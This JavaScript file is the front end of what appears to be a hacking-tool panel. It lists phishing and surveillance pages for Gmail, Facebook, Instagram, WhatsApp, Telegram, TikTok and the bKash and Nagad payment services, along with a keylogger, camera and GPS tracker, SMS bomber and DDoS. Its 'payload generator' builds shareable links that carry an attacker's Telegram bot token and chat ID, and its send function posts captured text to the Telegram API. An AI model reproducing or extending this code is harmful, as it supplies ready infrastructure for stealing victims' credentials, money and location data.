// ================= MATRIX RAIN =================
const canvas = document.getElementById('matrix-bg');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 14;
let columns = Math.floor(canvas.width / fontSize);
let drops = Array(columns).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 50);

// ================= TOOL + COURSE PAGES =================
const toolPages = {
    // ---- PROJECT TOOLS ----
    gps: './project/gps.html',
    camera: './project/camerapro.html',
    keylogger: './project/keylogger.html',
    sms: './project/sms bomber.html',
    device: './project/device.html',
    gmail: './project/gmail.html',
    facebook: './project/facebook.html',
    instagram: './project/instagram.html',
    whatsapp: './project/whatsapp.html',
    telegram: './project/telegram.html',
    tiktok: './project/tiktok.html',
    imo: './project/imo.html',
    phonelookup: './project/phonelookup.html',
    certificate: './project/certificate.html',
    freefire: './project/freefire.html',
    bkash: './project/bkash.html',
    nagad: './project/nagad.html',
    ddos: './project/ddos.html',
    wifi: './project/wifi.html',
    sql: './project/sql.html',
    hashcat: './project/hashcat.html',
    mitm: './project/mitm.html',
    stealth: './project/stealth.html',
    osint: './project/osint.html',
    nmap: './project/nmap.html',

    // ---- COURSES ----
    cybersecurity: './courses/cybersecurity.html',
    cehbangla: './courses/cehbangla.html',
    termux: './courses/termux.html',
    wifihack: './courses/wifihack.html',
    ethicalhack: './courses/ethicalhack.html',
    kalilinux: './courses/kalilinux.html',
    pythonhack: './courses/pythonhack.html',
    webhack: './courses/webhack.html',
    mobilehack: './courses/mobilehack.html',
    bugbounty: './courses/bugbounty.html',
    cloudsecurity: './courses/cloudsecurity.html',
    ciscocyberops: './courses/ciscocyberops.html',
    completedcyber: './courses/completedcyber.html',
    darkweb: './courses/darkweb.html',
    fbhacking: './courses/fbhacking.html',
    premium18: './courses/premium18.html',
    advrat: './courses/advrat.html',
    androiddev: './courses/androiddev.html',
    sqliwebsite: './courses/sqliwebsite.html'
};

// ================= PAGE OPEN =================
function openPage(tool) {
    const page = toolPages[tool];
    if (!page) {
        alert('❌ Page not found: ' + tool);
        return;
    }
    window.location.href = page;
}

// ================= PAYLOAD GENERATOR =================
function generatePayload(tool) {
    const page = toolPages[tool];
    if (!page) {
        alert('❌ Page not found');
        return;
    }

    const pageUrlObj = new URL(page, window.location.href);
    const outputDiv = document.getElementById(`output-${tool}`);

    let live = false;

    if (isSendingAllowed()) {
        const token = document.getElementById('globalBotToken')?.value.trim();
        const chat = document.getElementById('globalChatId')?.value.trim();

        if (token && chat) {
            const conf = prompt('Type EXACTLY "Rnasaks" to create LIVE sending link:');
            if (conf === 'Rnasaks') {
                const payload = btoa(JSON.stringify({ bot: token, chat: chat, tool }));
                pageUrlObj.searchParams.set('p', payload);
                live = true;
            }
        }
    }

    const pageUrl = pageUrlObj.href;

    outputDiv.innerHTML = `
        <p class="text-pink-400 font-bold mb-2 text-xs">
            🔗 Tool Ready: ${live ? '<span style="color:#f43f5e">LIVE SEND</span>' : 'DEMO'}
        </p>
        <a href="${pageUrl}" target="_blank" class="text-blue-400 underline break-all text-xs block mb-2">${pageUrl}</a>
        <div class="flex gap-2">
            <a href="${pageUrl}" target="_blank" class="bg-white/20 hover:bg-white/40 text-xs px-3 py-1 rounded font-bold text-black">🚀 OPEN</a>
            <button onclick="copyPayload('${pageUrl}')" class="bg-white/20 hover:bg-white/40 text-xs px-3 py-1 rounded font-bold text-black">📋 COPY</button>
        </div>
        ${live ? '<p class="text-xs text-red-400 mt-2">⚠️ LIVE: Will send data to Telegram</p>' : ''}
    `;
    outputDiv.style.display = 'block';
}

// ================= UTILITIES =================
function copyPayload(url) {
    navigator.clipboard.writeText(url).then(() => alert('✅ LINK COPIED!'));
}

function isSendingAllowed() {
    return location.hostname === 'localhost' ||
           sessionStorage.getItem('telegram_send_enabled') === '1' ||
           localStorage.getItem('telegram_send_allowed') === '1';
}

window.safeSendMessage = async (bot, chat, text) => {
    if (!isSendingAllowed()) {
        console.log('DEMO MODE:', text);
        return false;
    }
    try {
        const res = await fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text, parse_mode: 'Markdown' })
        });
        return (await res.json()).ok;
    } catch (e) {
        console.error(e);
        return false;
    }
};
